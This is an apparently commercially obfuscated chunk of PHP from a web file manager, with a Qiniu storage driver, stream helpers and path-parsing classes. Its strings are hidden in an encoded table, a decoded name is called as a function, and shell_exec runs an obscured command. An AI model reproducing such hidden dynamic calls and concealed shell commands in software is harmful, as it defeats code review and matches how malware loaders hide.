$ßò«¬ÜÖ[$ş€ô“Ÿ‘[838]] ? $ßò«¬ÜÖ[$ş€ô“Ÿ‘[1296]] : !1; } public function upload($†¹ø÷íÃ, $ÁµãñìÚ, $Ü¢³¬Ş = false, $šê›Áê• = REPEAT_REPLACE) { $èıÔõ® = new Qiniu\Storage\UploadManager(); $Ù‰ÆÕÁ = $this->auth->uploadToken($this->bucket, $†¹ø÷íÃ); $õ¿ ËŒ’ = get_file_mime(get_path_ext($ÁµãñìÚ)); list($®Íî´¾é, $êĞãã·ì) = $èıÔõ®->putFile($Ù‰ÆÕÁ, $†¹ø÷íÃ, $ÁµãñìÚ, null, $õ¿ ËŒ’); return $êĞãã·ì ? !1 : $this->getPathOuter($†¹ø÷íÃ); } public function uploadFormData($ŸâïÏ¬æ, $”â“ÔöÈ = 3600) { return $this->uploadToken($ŸâïÏ¬æ, $”â“ÔöÈ); } public function uploadMultiData($õœ¼¤¸ã, $«­Æ·¥ = 3600) { return $this->uploadToken($õœ¼¤¸ã, $«­Æ·¥); } private function uploadToken($œÀÃ‘¼», $Éç¶ı¤” = 3600) { $™ÊàÓóÌ =& $_SERVER[¼’ç§¼´]; $öè—ô§¯ = $Éç¶ı¤”; $Ô¤Ÿè²ˆ = array($™ÊàÓóÌ[1546] => $™ÊàÓóÌ[1547]); $İÑÖñ Ö = $œÀÃ‘¼»; $æòºÌ¥² = $this->auth->uploadToken($this->bucket, $İÑÖñ Ö, $öè—ô§¯, $Ô¤Ÿè²ˆ, !0); $ÆœŒµº = empty($this->region) || $this->region == $™ÊàÓóÌ[1548] ? $™ÊàÓóÌ[12] : $™ÊàÓóÌ[473] . $this->region; $¶ÜãÛìÆ = http_type() . "\72\57\x2f\x75\160\x6c\157\141\x64{$ÆœŒµº}\x2e\x71\151\156\151\165\160\56\143\157\155\57"; return array($™ÊàÓóÌ[1549] => $æòºÌ¥², $™ÊàÓóÌ[1550] => $¶ÜãÛìÆ); } public function download($Îê¸ÂÂò, $˜µ··İ“) { $·Î£…‚Æ = IO::getPathInner(IO::mkfile($˜µ··İ“)); if (!($¸„»ôàß = $this->link($Îê¸ÂÂò))) { return !1; } $…¦Ìø„× = 0; $Î°“Ü = 1024 * 200; $®õŠø§Ú = fopen($·Î£…‚Æ, $_SERVER[¼’ç§¼´][1551]); while (!0) { $¶ø©¼ŞÍ = $this->fileSubstr($Îê¸ÂÂò, $…¦Ìø„×, $Î°“Ü); if ($¶ø©¼ŞÍ === !1) { return !1; } fwrite($®õŠø§Ú, $¶ø©¼ŞÍ); $…¦Ìø„× += $Î°“Ü; if (strlen($¶ø©¼ŞÍ) < $Î°“Ü) { break; } } fclose($®õŠø§Ú); return $˜µ··İ“; } public function link($ÏÃòíº, $Ë›–ÒÉŞ = '') { if (!$this->isFile($ÏÃòíº)) { return !1; } $Û¢ÌÍíä = $this->getHost() . $_SERVER[¼’ç§¼´][8] . $this->pathEncode($ÏÃòíº) . $Ë›–ÒÉŞ; return $this->auth->privateDownloadUrl($Û¢ÌÍíä, 3600 * 12); } public function fileOut($õ¶£ôœû, $•‚¿ô = false, $‰¦Ú³Ğ– = false, $¸ïßÔş‰ = '') { $ØÀì÷ì© =& $_SERVER[¼’ç§¼´]; if ($this->isFileOutServer()) { return $this->fileOutServer($õ¶£ôœû, $•‚¿ô, $‰¦Ú³Ğ–, $¸ïßÔş‰); } if (!$‰¦Ú³Ğ–) { $‰¦Ú³Ğ– = $this->pathThis($õ¶£ôœû); } $ÇÇòíÊŞ = $•‚¿ô ? $ØÀì÷ì©[1552] . rawurlencode($‰¦Ú³Ğ–) : $ØÀì÷ì©[12]; $•ÇÊ™•’ = $this->link($õ¶£ôœû, $ÇÇòíÊŞ); $this->fileOutLink($•ÇÊ™•’); } public function fileOutServer($Ô•¸‹üÀ, $Òı”·éÎ = false, $½Èé¾èß = false, $¿µÜß… = '') { parent::fileOut($Ô•¸‹üÀ, $Òı”·éÎ, $½Èé¾èß, $¿µÜß…); } public function fileOutImage($¿„äÂ«Ü, $ˆßŞ­³’ = 250) { if ($this->size($¿„äÂ«Ü) > 1024 * 1024 * 20) { return $this->fileOutImageServer($¿„äÂ«Ü, $ˆßŞ­³’); } $ö¹Ì«° = $this->link($¿„äÂ«Ü, $_SERVER[¼’ç§¼´][1553] . $ˆßŞ­³’); $this->fileOutLink($ö¹Ì«°); } public function fileOutImageServer($ÄÚé§Ãñ, $‘İŒÌˆİ = 250) { parent::fileOutImage($ÄÚé§Ãñ, $‘İŒÌˆİ); } public function hashMd5($¬Î­·–è) { $æÚÚç‘ =& $_SERVER[¼’ç§¼´]; $åÒñ¿ãö = $this->objectMeta($¬Î­·–è); return isset($åÒñ¿ãö[$æÚÚç‘[247]]) ? $åÒñ¿ãö[$æÚÚç‘[247]] : !1; $€ÚÇÖÇ = $this->link($¬Î­·–è, $æÚÚç‘[1554]); } public function size($Ñ‚ÒÊÜ›) { $ÕÃßó±® = $this->objectMeta($Ñ‚ÒÊÜ›); return $ÕÃßó±® ? $ÕÃßó±®[$_SERVER[¼’ç§¼´][79]] : 0; } public function info($Ö²Ô¤ŠË) { if ($this->isFolder($Ö²Ô¤ŠË)) { return $this->folderInfo($Ö²Ô¤ŠË); } else { if ($this->isFile($Ö²Ô¤ŠË)) { return $this->fileInfo($Ö²Ô¤ŠË); } } return !1; } public function exist($ç»ã¯„Ñ) { return $this->isFile($ç»ã¯„Ñ) || $this->isFolder($ç»ã¯„Ñ); } public function isFile($¤«Îá) { return !$this->isFolder($¤«Îá) && $this->objectMeta($¤«Îá); } public function isFolder($„‘ÑÀÏ¦) { return $this->cacheMethod($_SERVER[¼’ç§¼´][179], $„‘ÑÀÏ¦); } protected function objectMeta($ü¯Áå¼«) { return $this->cacheMethod($_SERVER[¼’ç§¼´][181], $ü¯Áå¼«); } protected function _objectMeta($“ú›æÌ) { $ïº£â‹ =& $_SERVER[¼’ç§¼´]; list($êİŒï€€, $É•›Ïõ«) = $this->bucketManager->stat($this->bucket, $“ú›æÌ); if ($êİŒï€€) { $êİŒï€€[$ïº£â‹[79]] = intval($êİŒï€€[$ïº£â‹[1540]]); } return $êİŒï€€; } protected function _isFolder($ÒÜ•èû) { $Áİ Âúä =& $_SERVER[¼’ç§¼´]; if ($ÒÜ•èû == $Áİ Âúä[12] || $ÒÜ•èû == $Áİ Âúä[8]) { return !0; } list($¥²ı§·Ü, $ş¬ªÛœê) = $this->bucketManager->listFiles($this->bucket, trim($ÒÜ•èû, $Áİ Âúä[8]) . $Áİ Âúä[8], $Áİ Âúä[12], 1, $Áİ Âúä[8]); return !empty($¥²ı§·Ü[$Áİ Âúä[1543]]) || !empty($¥²ı§·Ü[$Áİ Âúä[1544]]) ? !0 : !1; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($Àö˜Úù®, $¸±Ó£÷À = 0) { parent::__construct(); $this->source = $Àö˜Úù®; $this->sourceSize = $¸±Ó£÷À; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($ù»—ó€® = false) { return $this->sourceSize; } public function getContent($†¬¡œ = false) { return $this->fileSubstr($†¬¡œ, 0, $this->sourceSize); } public function fileSubstr($É¼± = false, $Ğ¶À¸·£ = 0, $Ş§úÇ¥Õ = 0) { if (!$Ş§úÇ¥Õ) { $Ş§úÇ¥Õ = $this->sourceSize; } $ıæ¨ûñë = $this->sourceSize - $Ğ¶À¸·£; if ($Ş§úÇ¥Õ >= $ıæ¨ûñë) { $Ş§úÇ¥Õ = $ıæ¨ûñë; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $Ğ¶À¸·£, $Ş§úÇ¥Õ); } if ($this->sourceType == self::TYPE_FILE) { if ($Ş§úÇ¥Õ <= 0) { return $_SERVER[¼’ç§¼´][12]; } $ªîøşûš = ftell($this->source); fseek_64($this->source, $ªîøşûš + $Ğ¶À¸·£); $ñ§Ë¾•‹ = @fread($this->source, $Ş§úÇ¥Õ); fseek_64($this->source, $ªîøşûš); return $ñ§Ë¾•‹; } } public function hashMd5($ââëÅ¨Ö = false) { return md5($this->getContent()); } public static function hash($ª¿›°Ó§, $€ìäœç = 0) { $‚”´Øö = new PathDriverStream($ª¿›°Ó§, $€ìäœç); return $‚”´Øö->hashSimple($ª¿›°Ó§); } public static function md5($¯©Å¬ü, $Ù³´ÃÔ± = 0) { $šŞ½©Û­ = new PathDriverStream($¯©Å¬ü, $Ù³´ÃÔ±); return $šŞ½©Û­->hashMd5($¯©Å¬ü); } } goto FˆêŞº’ã; B‘ø˜‚Ã÷: $fileSize = strrev(base64_decode($_SERVER[×şÎ» Ü][0])); function binCheckNeq($ĞÎ¨òì‚, $üõåæäÕ) { return $ĞÎ¨òì‚ != $üõåæäÕ; } $_SERVER[$_SERVER[×şÎ» Ü][1]] = $fileSize($_SERVER[$_SERVER[×şÎ» Ü][2]]); goto e§İŠÓêíù; A‚Õ’ÈƒŒÆ: class KodIO { const KOD_SOURCE = "\173\x73\157\165\x72\x63\145\175"; const KOD_USER_RECYCLE = "\173\165\x73\x65\162\122\145\x63\x79\x63\x6c\145\x7d"; const KOD_USER_FAV = "\173\165\x73\x65\x72\x46\141\x76\x7d"; const KOD_USER_FILE_TAG = "\173\x75\163\x65\x72\x46\151\x6c\145\x54\x61\147\x7d"; const KOD_USER_FILE_TYPE = "\x7b\165\163\x65\162\x46\x69\x6c\145\124\171\160\x65\x7d"; const KOD_GROUP_ROOT_SELF = "\173\147\162\157\165\160\x52\157\x6f\x74\123\x65\x6c\146\175"; const KOD_USER_SHARE = "\x7b\x75\x73\x65\x72\123\150\x61\x72\145\175"; const KOD_USER_SHARE_LINK = "\173\x75\163\x65\162\x53\150\x61\162\x65\x4c\x69\156\x6b\175"; const KOD_USER_SHARE_TO_ME = "\x7b\163\x68\x61\162\145\124\157\x4d\x65\175"; const KOD_SHARE_ITEM = "\x7b\163\x68\x61\162\x65\111\x74\145\x6d\175"; const KOD_SHARE_LINK = "\173\163\150\x61\x72\x65\111\164\145\155\114\151\x6e\153\x7d"; const KOD_SEARCH = "\x7b\163\x65\x61\x72\143\150\x7d"; const KOD_BLOCK = "\173\142\154\x6f\143\153\175"; const KOD_IO = "\x7b\x69\157\x7d"; const KOD_USER_RECENT = "\x7b\165\163\145\x72\x52\145\x6e\143\x65\x6e\164\x7d"; const KOD_USER_DRIVER = "\173\x64\x72\x69\x76\145\162\175"; public static function typeList() { $½ ˆˆÕ =& $_SERVER[¼’ç§¼´]; return array($½ ˆˆÕ[1345] => self::KOD_SOURCE, $½ ˆˆÕ[1346] => self::KOD_USER_RECYCLE, $½ ˆˆÕ[1347] => self::KOD_USER_FAV, $½ ˆˆÕ[1348] => self::KOD_USER_FILE_TAG, $½ ˆˆÕ[1349] => self::KOD_USER_FILE_TYPE, $½ ˆˆÕ[1350] => self::KOD_GROUP_ROOT_SELF, $½ ˆˆÕ[1351] => self::KOD_USER_SHARE, $½ ˆˆÕ[1352] => self::KOD_USER_SHARE_LINK, $½ ˆˆÕ[1353] => self::KOD_USER_SHARE_TO_ME, $½ ˆˆÕ[1354] => self::KOD_SHARE_ITEM, $½ ˆˆÕ[1355] => self::KOD_SHARE_LINK, $½ ˆˆÕ[1356] => self::KOD_SEARCH, $½ ˆˆÕ[1357] => self::KOD_BLOCK, $½ ˆˆÕ[1358] => self::KOD_IO, $½ ˆˆÕ[1359] => self::KOD_USER_RECENT, $½ ˆˆÕ[1360] => self::KOD_USER_DRIVER); } public static function parse($¾¼úÀÏ) { $üşæÂĞ‹ =& $_SERVER[¼’ç§¼´]; $¾¼úÀÏ = self::clear($¾¼úÀÏ); $ï¹ãí´á = array_values(self::typeList()); preg_match($üşæÂĞ‹[1361], $¾¼úÀÏ, $µê„Óµ†); $÷çóï£È = array($üşæÂĞ‹[507] => !1, $üşæÂĞ‹[1362] => !1, $üşæÂĞ‹[504] => !1, $üşæÂĞ‹[87] => $¾¼úÀÏ, $üşæÂĞ‹[1260] => !1, $üşæÂĞ‹[1259] => $üşæÂĞ‹[12]); if (is_array($µê„Óµ†) && count($µê„Óµ†) == 5) { $ìÇĞ’Ü = $üşæÂĞ‹[1363] . $µê„Óµ†[2] . $üşæÂĞ‹[404]; if (in_array($ìÇĞ’Ü, $ï¹ãí´á)) { $÷çóï£È[$üşæÂĞ‹[1260]] = $µê„Óµ†[1]; $÷çóï£È[$üşæÂĞ‹[33]] = $ìÇĞ’Ü; $÷çóï£È[$üşæÂĞ‹[1364]] = substr($ìÇĞ’Ü, 1, -1); $÷çóï£È[$üşæÂĞ‹[486]] = $µê„Óµ†[3]; } $÷çóï£È[$üşæÂĞ‹[1259]] = $µê„Óµ†[4]; } $²ôŞ½ê‡ = array($üşæÂĞ‹[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $÷çóï£È[$üşæÂĞ‹[1327]] = in_array($÷çóï£È[$üşæÂĞ‹[33]], $²ôŞ½ê‡); return $÷çóï£È; } public static function isTruePath($¹«áûç) { $ß¤çÍÑ¥ =& $_SERVER[¼’ç§¼´]; if (substr($¹«áûç, 0, 1) != $ß¤çÍÑ¥[1363]) { return !0; } if (strpos($¹«áûç, $ß¤çÍÑ¥[494]) === 0) { return !0; } if (strpos($¹«áûç, $ß¤çÍÑ¥[1331]) === 0) { return !0; } if (strpos($¹«áûç, $ß¤çÍÑ¥[1365]) === 0) { return !0; } if (strpos($¹«áûç, $ß¤çÍÑ¥[1366]) === 0) { return !0; } if (strpos($¹«áûç, $ß¤çÍÑ¥[1367]) === 0) { return !0; } return !1; } public static function clear($ÔÒŞ¾³) { $¹ëÄÒ­Ê =& $_SERVER[¼’ç§¼´]; $ÔÒŞ¾³ = str_replace(array($¹ëÄÒ­Ê[1165], $¹ëÄÒ­Ê[287]), $¹ëÄÒ­Ê[53], $ÔÒŞ¾³); $ÔÒŞ¾³ = str_replace($¹ëÄÒ­Ê[100], $¹ëÄÒ­Ê[8], $ÔÒŞ¾³); $²„äóŒ¤ = $¹ëÄÒ­Ê[1368]; if (substr($ÔÒŞ¾³, 0, 3) == $¹ëÄÒ­Ê[1369]) { $ÔÒŞ¾³ = substr($ÔÒŞ¾³, 3); } while (strstr($ÔÒŞ¾³, $²„äóŒ¤)) { $ÔÒŞ¾³ = str_replace($²„äóŒ¤, $¹ëÄÒ­Ê[8], $ÔÒŞ¾³); } $ÔÒŞ¾³ = preg_replace($¹ëÄÒ­Ê[1370], $¹ëÄÒ­Ê[8], $ÔÒŞ¾³); if ($ÔÒŞ¾³ == $¹ëÄÒ­Ê[8]) { return $¹ëÄÒ­Ê[8]; } $ÔÒŞ¾³ = rtrim($ÔÒŞ¾³, $¹ëÄÒ­Ê[8]); return $ÔÒŞ¾³; } public static function pathTrue($êùÕÓÙÀ) { $±âÁùü» =& $_SERVER[¼’ç§¼´]; if (!$êùÕÓÙÀ) { return $±âÁùü»[12]; } $êùÕÓÙÀ = str_replace($±âÁùü»[256], $±âÁùü»[8], str_replace($±âÁùü»[1371], $±âÁùü»[8], $êùÕÓÙÀ)); $êùÕÓÙÀ = str_replace($±âÁùü»[256], $±âÁùü»[8], str_replace($±âÁùü»[1371], $±âÁùü»[8], $êùÕÓÙÀ)); if (!strstr($êùÕÓÙÀ, $±âÁùü»[1369])) { return $êùÕÓÙÀ; } $Ã—¤­ä = explode($±âÁùü»[8], $êùÕÓÙÀ); foreach ($Ã—¤­ä as $¯¥åÆüÒ => $œ³‰ìš•) { if ($œ³‰ìš• !== $±âÁùü»[1372]) { continue; } for ($õÛ•Ø“ì = $¯¥åÆüÒ; $õÛ•Ø“ì >= 0; $õÛ•Ø“ì--) { if ($Ã—¤­ä[$õÛ•Ø“ì] === $±âÁùü»[10] || $Ã—¤­ä[$õÛ•Ø“ì] === $±âÁùü»[1372] || $Ã—¤­ä[$õÛ•Ø“ì] === -1) { continue; } if ($Ã—¤­ä[$õÛ•Ø“ì] === $±âÁùü»[12]) { $Ã—¤­ä[$¯¥åÆüÒ] = -1; break; } $Ã—¤­ä[$¯¥åÆüÒ] = -1; $Ã—¤­ä[$õÛ•Ø“ì] = -1; break; } } $‰Ëº—ü = array(); foreach ($Ã—¤­ä as $œ³‰ìš•) { if ($œ³‰ìš• !== -1) { $‰Ëº—ü[] = $œ³‰ìš•; } } $ƒêÒç¿ = implode($±âÁùü»[8], $‰Ëº—ü); if (strpos($ƒêÒç¿, $±âÁùü»[1373]) === 0) { $ƒêÒç¿ = $±âÁùü»[1369] . substr($ƒêÒç¿, strlen($±âÁùü»[1373])); } return $ƒêÒç¿; } public static function pathUrlClear($ŠÀ÷”‘Î) { $§ó±˜„å =& $_SERVER[¼’ç§¼´]; if (!$ŠÀ÷”‘Î) { return $ŠÀ÷”‘Î; } $ŠÀ÷”‘Î = rawurldecode($ŠÀ÷”‘Î); $ŠÀ÷”‘Î = str_replace($§ó±˜„å[1371], $§ó±˜„å[8], $ŠÀ÷”‘Î); if (strpos($ŠÀ÷”‘Î, $§ó±˜„å[76]) > 0) { $ŠÀ÷”‘Î = substr($ŠÀ÷”‘Î, 0, strpos($ŠÀ÷”‘Î, $§ó±˜„å[76])); } if (strpos($ŠÀ÷”‘Î, $§ó±˜„å[1374]) > 0) { $ŠÀ÷”‘Î = substr($ŠÀ÷”‘Î, 0, strpos($ŠÀ÷”‘Î, $§ó±˜„å[1374])); } return $ŠÀ÷”‘Î; } public static function sourceID($ÂŠ×—Ëú) { $§Ò°Õ =& $_SERVER[¼’ç§¼´]; $Ó¯İ¬¬¬ = self::parse($ÂŠ×—Ëú); if ($Ó¯İ¬¬¬[$§Ò°Õ[33]] !== self::KOD_SOURCE) { show_json(LNG($§Ò°Õ[1375]), !1); } return $Ó¯İ¬¬¬[$§Ò°Õ[486]]; } public static function make($àíø°Á’) { if (!$àíø°Á’) { return !1; } return self::makePath(self::KOD_SOURCE, intval($àíø°Á’)); } public static function makeShare($Ë¶Ûª„, $Óœ§Îò™) { return self::makePath(self::KOD_SHARE_ITEM, $Ë¶Ûª„, $Óœ§Îò™); } public static function makeFileTypePath($ô—Â£³å) { return self::makePath(self::KOD_USER_FILE_TYPE, $ô—Â£³å); } public static function makeFileTagPath($ÈÒ½Ä¯ø) { return self::makePath(self::KOD_USER_FILE_TAG, $ÈÒ½Ä¯ø); } public static function makePath($¡é‡óÄ, $–ô™»‰ê = '', $áš¡ëæ = '') { $§í¶¼¶¤ =& $_SERVER[¼’ç§¼´]; $ı®š€÷¾ = substr($¡é‡óÄ, 1, -1); $¼áÔ©»¶ = $§í¶¼¶¤[1376] . $ı®š€÷¾ . $§í¶¼¶¤[1377] . $–ô™»‰ê . $§í¶¼¶¤[1378]; $¼áÔ©»¶ = $áš¡ëæ ? $¼áÔ©»¶ . $áš¡ëæ . $§í¶¼¶¤[8] : $¼áÔ©»¶; return $¼áÔ©»¶; } public static function hashPath($¼‚ÆÓ, $ªúÚ«¹ç = true) { $ƒ©ûÏµ¾ =& $_SERVER[¼’ç§¼´]; $Êø£êâº = is_array($¼‚ÆÓ) ? $¼‚ÆÓ : IO::info($¼‚ÆÓ); $Ä“ÏïºÉ = _get($Êø£êâº, $ƒ©ûÏµ¾[1379], $ƒ©ûÏµ¾[12]); if (!$Ä“ÏïºÉ && isset($Êø£êâº[$ƒ©ûÏµ¾[237]])) { $Ä“ÏïºÉ = trim($Êø£êâº[$ƒ©ûÏµ¾[237]], $ƒ©ûÏµ¾[121]); } if (!$Ä“ÏïºÉ && isset($Êø£êâº[$ƒ©ûÏµ¾[193]]) && $Êø£êâº[$ƒ©ûÏµ¾[193]]) { $Êø£êâº = IO::info(KodIO::make($Êø£êâº[$ƒ©ûÏµ¾[193]])); $Ä“ÏïºÉ = _get($Êø£êâº, $ƒ©ûÏµ¾[1379], $ƒ©ûÏµ¾[12]); } $ª¿¿Ïóù = md5($Êø£êâº[$ƒ©ûÏµ¾[87]] . $Êø£êâº[$ƒ©ûÏµ¾[79]] . $Êø£êâº[$ƒ©ûÏµ¾[88]]); if (!$Ä“ÏïºÉ && file_exists($Êø£êâº[$ƒ©ûÏµ¾[87]])) { $Ä“ÏïºÉ = Cache::get($ª¿¿Ïóù . $ƒ©ûÏµ¾[1380]); $Ä“ÏïºÉ = !1; if (!$Ä“ÏïºÉ) { $Ä“ÏïºÉ = IO::hashSimple($Êø£êâº[$ƒ©ûÏµ¾[87]]); Cache::set($ª¿¿Ïóù . $ƒ©ûÏµ¾[1380], $Ä“ÏïºÉ, 3600 * 24 * 30); } } if ($ªúÚ«¹ç && !$Ä“ÏïºÉ) { } return $Ä“ÏïºÉ ? $Ä“ÏïºÉ : $ª¿¿Ïóù; } public static function hashPathSafe($ËĞèŸ›Ê, $¤ì²ÊŒÊ = true) { $ªªòÓ‘Œ =& $_SERVER[¼’ç§¼´]; $‰¿œ’öô = self::hashPath($ËĞèŸ›Ê, $¤ì²ÊŒÊ); return md5($‰¿œ’öô . $ªªòÓ‘Œ[1381] . Model($ªªòÓ‘Œ[858])->get($ªªòÓ‘Œ[859])); } public static function initSystemPath() { $˜É¤şáË =& $_SERVER[¼’ç§¼´]; if (defined($˜É¤şáË[1382])) { return; } define($˜É¤şáË[1382], self::systemPath($˜É¤şáË[191])); define($˜É¤şáË[1383], self::systemPath($˜É¤şáË[1384])); define($˜É¤şáË[1385], self::systemPath($˜É¤şáË[1386])); define($˜É¤şáË[1387], self::systemPath($˜É¤şáË[1388])); IOHistory::bindEvent(); } public static function systemPath($†§öóìÑ) { $¯ÓœÖı =& $_SERVER[¼’ç§¼´]; $º±¥ü¥Ú = $¯ÓœÖı[1389] . ucfirst($†§öóìÑ); $°²Ê‚‹ = Model($¯ÓœÖı[858])->get($º±¥ü¥Ú); if ($°²Ê‚‹) { return $°²Ê‚‹; } if ($†§öóìÑ == $¯ÓœÖı[191]) { $°²Ê‚‹ = self::make(Model($¯ÓœÖı[913])->systemRootPathAdd($¯ÓœÖı[619])); } else { $°²Ê‚‹ = self::systemPath($¯ÓœÖı[191]); $¨šƒŞ…¬ = self::sourceID($°²Ê‚‹); $°²Ê‚‹ = self::make(Model($¯ÓœÖı[913])->mkdir($¨šƒŞ…¬, $†§öóìÑ)); } Model($¯ÓœÖı[858])->set($º±¥ü¥Ú, $°²Ê‚‹); return $°²Ê‚‹; } public static function systemFolder($ò‚ËœÕÍ) { $ããê­¶÷ = IO_PATH_SYSTEM_SOURCE . $ò‚ËœÕÍ; $öâÑö¬Ÿ = Cache::get($ããê­¶÷); if (!$öâÑö¬Ÿ) { $ÂõÇâ¿© = IO::infoFullSimple($ããê­¶÷); if (!$ÂõÇâ¿©) { $öâÑö¬Ÿ = IO::mkdir($ããê­¶÷, REPEAT_SKIP); } else { $öâÑö¬Ÿ = $ÂõÇâ¿©[$_SERVER[¼’ç§¼´][87]]; } Cache::set($ããê­¶÷, $öâÑö¬Ÿ, 3600 * 10); } return $öâÑö¬Ÿ; } public static function defaultDriver() { return Model($_SERVER[¼’ç§¼´][855])->defaultDriver(); } public static function defaultIO() { $À‘€ªŞÈ =& $_SERVER[¼’ç§¼´]; $à²èÔû¼ = self::defaultDriver(); return $À‘€ªŞÈ[1390] . $à²èÔû¼[$À‘€ªŞÈ[486]] . $À‘€ªŞÈ[1378]; } public static function defaultDriverInit() { static $šé…½©¸ = false; if ($šé…½©¸) { return $šé…½©¸; } $šé…½©¸ = IO::init(self::defaultIO()); return $šé…½©¸; } public static function fileTypeList() { $¯íØÎã” =& $_SERVER[¼’ç§¼´]; $£½”ÚØŸ = $GLOBALS[$¯íØÎã”[6]][$¯íØÎã”[1391]]; foreach ($£½”ÚØŸ as $±Â¡ê™÷ => $î ¢Ò§«) { $òıåìâÆ = $¯íØÎã”[1392] . $±Â¡ê™÷; $©ƒïÈûò = LNG($òıåìâÆ); if ($òıåìâÆ != $©ƒïÈûò) { $£½”ÚØŸ[$±Â¡ê™÷][$¯íØÎã”[32]] = $©ƒïÈûò; } } return $£½”ÚØŸ; } public static function diskList($“ŒŒ«˜ = true) { $˜â Ôé = $_SERVER[¼’ç§¼´][1393]; if ($“ŒŒ«˜) { $¤âÈ—€à = Cache::get($˜â Ôé); if (is_array($¤âÈ—€à)) { return $¤âÈ—€à; } } $¤âÈ—€à = self::diskListGet(); Cache::set($˜â Ôé, $¤âÈ—€à, 60); return $¤âÈ—€à; } public static function diskListGet() { $‹™…àô´ =& $_SERVER[¼’ç§¼´]; $±‚²¯†Í = array(); if ($GLOBALS[$‹™…àô´[6]][$‹™…àô´[1394]] == $‹™…àô´[1395]) { $ô¿·–£ = $‹™…àô´[1396]; for ($©ßğ¾¹« = 0; $©ßğ¾¹« < strlen($ô¿·–£); $©ßğ¾¹«++) { $­ÉÒäì = $ô¿·–£[$©ßğ¾¹«] . $‹™…àô´[1397]; if (file_exists($­ÉÒäì)) { $±‚²¯†Í[] = $­ÉÒäì; } } return $±‚²¯†Í; } if (!function_exists($‹™…àô´[101])) { $±‚²¯†Í[] = $‹™…àô´[924]; return $±‚²¯†Í; } $£¿³¥¸° = explode($‹™…àô´[287], shell_exec($‹™…àô´[1398])); array_shift($£¿³¥¸°); array_pop($£¿³¥¸°); $ÜÅ¼¤üı = array($‹™…àô´[1399], $‹™…àô´[1400], $‹™…àô´[1401], $‹™…àô´[1402], $‹™…àô´[1403], $‹™…àô´[1404], $‹™…àô´[1405], $‹™…àô´[1406]); foreach ($£¿³¥¸° as $«¨´½Ã) { $´¢á™ = preg_split($‹™…àô´[1407], $«¨´½Ã); $­ÉÒäì = $´¢á™[count($´¢á™) - 1]; if (!strstr($´¢á™[0], $‹™…àô´[1408]) || !$­ÉÒäì) { continue; } $—‹Ø¤‰ğ = rtrim($­ÉÒäì, $‹™…àô´[8]) . $‹™…àô´[8]; if (in_array($—‹Ø¤‰ğ, $ÜÅ¼¤üı)) { continue; } $±‚²¯†Í[] = $—‹Ø¤‰ğ; } return $±‚²¯†Í; } public static function isSameDisk($çİ¯Ø…µ, $ú¦¾’‡›) { $«‚’Íéè =& $_SERVER[¼’ç§¼´]; if ($GLOBALS[$«‚’Íéè[6]][$«‚’Íéè[1394]] == $«‚’Íéè[1395]) { return strtolower(substr($çİ¯Ø…µ, 0, 1)) == strtolower(substr($ú¦¾’‡›, 0, 1)); } $ÌíŞñ´¼ = stat($çİ¯Ø…µ); $¦â£¾¨‰ = stat($ú¦¾’‡›); if ($ÌíŞñ´¼ === !1 || $¦â£¾¨‰ === !1) { return !1; } return $ÌíŞñ´¼[$«‚’Íéè[1409]] === $¦â£¾¨‰[$«‚’Íéè[1409]]; $çÍçÊ±Ğ = self::diskList(); $‘‹›´â‡ = !1; $×¥¨‡¯§ = !1; sort($çÍçÊ±Ğ); $çÍçÊ±Ğ = array_reverse($çÍçÊ±Ğ); $çİ¯Ø…µ = rtrim($çİ¯Ø…µ, $«‚’Íéè[8]) . $«‚’Íéè[8]; $ú¦¾’‡› = rtrim($ú¦¾’‡›, $«‚’Íéè[8]) . $«‚’Íéè[8]; foreach ($çÍçÊ±Ğ as $éÄüÑ¬Š) { $¸´–ïó© = strlen($éÄüÑ¬Š); if (!$‘‹›´â‡ && substr($çİ¯Ø…µ, 0, $¸´–ïó©) == $éÄüÑ¬Š) { $‘‹›´â‡ = $éÄüÑ¬Š; } if (!$×¥¨‡¯§ && substr($ú¦¾’‡›, 0, $¸´–ïó©) == $éÄüÑ¬Š) { $×¥¨‡¯§ = $éÄüÑ¬Š; } if ($‘‹›´â‡ && $×¥¨‡¯§) { break; } } return $‘‹›´â‡ === $×¥¨‡¯§; } public static function transferType($æµæ×¹˜, $Ãà•©¹£) { $³›øµÚõ =& $_SERVER[¼’ç§¼´]; $ªå©ƒç£ = self::driverType($æµæ×¹˜); $º£–ŠÓö = self::driverType($Ãà•©¹£); if ($ªå©ƒç£[$³›øµÚõ[33]] == $º£–ŠÓö[$³›øµÚõ[33]] && $ªå©ƒç£[$³›øµÚõ[1410]] == $º£–ŠÓö[$³›øµÚõ[1410]]) { return $³›øµÚõ[1411]; } if ($ªå©ƒç£[$³›øµÚõ[33]] == $³›øµÚõ[958] && $º£–ŠÓö[$³›øµÚõ[33]] == $³›øµÚõ[109]) { return $³›øµÚõ[1288]; } if ($ªå©ƒç£[$³›øµÚõ[33]] == $³›øµÚõ[109] && $º£–ŠÓö[$³›øµÚõ[33]] == $³›øµÚõ[958]) { return $³›øµÚõ[110]; } return $³›øµÚõ[1412]; } public static function driverType($¸Àê¤Ìó) { $äœÈÍ¹ó =& $_SERVER[¼’ç§¼´]; $°Ö”Ô—Ä = str_replace($äœÈÍ¹ó[1413], $äœÈÍ¹ó[12], strtolower($¸Àê¤Ìó->getType())); if ($°Ö”Ô—Ä == $äœÈÍ¹ó[845] || $°Ö”Ô—Ä == $äœÈÍ¹ó[1414] || $°Ö”Ô—Ä == $äœÈÍ¹ó[1415]) { $¸Àê¤Ìó = self::defaultDriverInit(); } else { if ($°Ö”Ô—Ä == $äœÈÍ¹ó[1298] || $°Ö”Ô—Ä == $äœÈÍ¹ó[1416]) { $¸Àê¤Ìó = IO::init($¸Àê¤Ìó->pathParse[$äœÈÍ¹ó[1241]]); } } $¶º¦ºƒ’ = $¸Àê¤Ìó->path; $°Ö”Ô—Ä = str_replace($äœÈÍ¹ó[1413], $äœÈÍ¹ó[12], strtolower($¸Àê¤Ìó->getType())); if ($°Ö”Ô—Ä == $äœÈÍ¹ó[109]) { return array($äœÈÍ¹ó[33] => $äœÈÍ¹ó[109], $äœÈÍ¹ó[1410] => $äœÈÍ¹ó[12], $äœÈÍ¹ó[87] => $¶º¦ºƒ’, 